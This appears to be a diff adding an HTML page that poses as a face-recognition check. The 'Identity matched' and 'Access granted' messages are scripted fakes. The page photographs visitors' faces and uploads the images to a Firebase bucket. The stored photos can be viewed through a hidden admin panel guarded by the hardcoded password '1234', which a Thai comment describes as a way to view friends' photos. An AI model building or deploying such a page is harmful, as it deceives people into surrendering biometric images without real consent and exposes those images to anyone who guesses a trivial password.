@@ -1,0 +1,174 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Face Scan Full Demo v.5</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<style>
+body {
+  background:black; 
+  color:#00ffcc; 
+  font-family:monospace; 
+  text-align:center; 
+  margin:0; 
+  padding:0;
+}
+#version{
+  position:fixed;
+  bottom:5px;
+  right:10px;
+  color:#ff00ff;
+  font-weight:bold;
+}
+#container{
+  position:relative;
+  width:90vw; 
+  max-width:400px; 
+  margin:40px auto;
+}
+video{
+  width:100%;
+  border:3px solid #00ffcc;
+}
+#line{
+  position:absolute;
+  width:100%;
+  height:4px;
+  background:red;
+  top:0;
+  animation:scan 2s linear infinite;
+}
+@keyframes scan{0%{top:0;}100%{top:100%;}}
+#menuBtn{
+  position:fixed;
+  top:10px;
+  right:15px;
+  font-size:28px;
+  background:transparent;
+  color:#00ffcc;
+  border:none;
+  cursor:pointer;
+}
+button{
+  margin-top:10px;
+  padding:8px 15px;
+  background:#00ffcc;
+  border:none;
+  cursor:pointer;
+}
+#adminPanel{
+  display:none;
+  margin-top:20px;
+}
+img{
+  display:block;
+  margin:auto;
+  margin-top:10px;
+  max-width:90vw;
+}
+</style>
+</head>
+<body>
+
+<h2>Face Recognition Required</h2>
+<p>Allow camera access to continue</p>
+<button id="menuBtn" onclick="adminLogin()">⋮</button>
+
+<div id="container">
+  <video id="video" autoplay playsinline></video>
+  <div id="line"></div>
+</div>
+
+<p id="status">Waiting for camera...</p>
+<button onclick="capture()">Allow Face Capture</button>
+<canvas id="canvas" style="display:none;"></canvas>
+<img id="photo"/>
+<div id="adminPanel"><h2>Admin Panel</h2></div>
+
+<div id="version">v.5</div>
+
+<!-- Firebase SDK -->
+<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-storage-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-auth-compat.js"></script>
+
+<script>
+// 🔹 ใส่ config จริงของ Firebase ที่โปรเจกต์ของนาย
+const firebaseConfig = {
+  apiKey: "ใส่ของจริง",
+  authDomain: "ใส่ของจริง",
+  projectId: "ใส่ของจริง",
+  storageBucket: "ใส่ของจริง",
+  messagingSenderId: "ใส่ของจริง",
+  appId: "ใส่ของจริง"
+};
+firebase.initializeApp(firebaseConfig);
+const storage = firebase.storage();
+const db = firebase.firestore();
+const auth = firebase.auth();
+auth.signInAnonymously().catch(err=>console.log(err));
+
+const video = document.getElementById("video");
+const status = document.getElementById("status");
+const adminPanel = document.getElementById("adminPanel");
+
+// เปิดกล้องหน้า
+navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+.then(stream=>{
+  video.srcObject=stream;
+  status.innerText="Scanning...";
+  setTimeout(()=>{status.innerText="Analyzing face...";},2000);
+  setTimeout(()=>{status.innerText="Identity matched";},4000);
+  setTimeout(()=>{status.innerText="Access granted";},6000);
+})
+.catch(err=>{status.innerText="Camera access denied";});
+
+// Capture + upload
+async function capture(){
+  const canvas=document.getElementById("canvas");
+  canvas.width=video.videoWidth;
+  canvas.height=video.videoHeight;
+  const ctx=canvas.getContext("2d");
+  ctx.drawImage(video,0,0);
+  const imgData=canvas.toDataURL("image/png");
+  document.getElementById("photo").src=imgData;
+
+  const blob=await (await fetch(imgData)).blob();
+  const filename=`faces/${Date.now()}.png`;
+  const ref=storage.ref().child(filename);
+  await ref.put(blob);
+  const url=await ref.getDownloadURL();
+  await db.collection("capturedFaces").add({url:url,timestamp:Date.now()});
+
+  alert("Face captured!");
+  
+  // ถ้า admin เปิดแล้วให้ append ทันที
+  if(adminPanel.style.display === "block"){
+    const img = document.createElement("img");
+    img.src = url;
+    img.style.maxWidth = "90vw";
+    adminPanel.appendChild(img);
+  }
+}
+
+// Admin login + ดูรูปเพื่อน
+async function adminLogin(){
+  let pass=prompt("Enter admin password:");
+  if(pass==="1234"){
+    adminPanel.style.display="block";
+    adminPanel.innerHTML="<h2>Admin Panel</h2>"; // reset header
+    const snapshot=await db.collection("capturedFaces").orderBy("timestamp","desc").get();
+    snapshot.forEach(doc=>{
+      const img=document.createElement("img");
+      img.src=doc.data().url;
+      img.style.maxWidth="90vw";
+      adminPanel.appendChild(img);
+    });
+  } else {
+    alert("Wrong password");
+  }
+}
+</script>
+</body>
+</html>
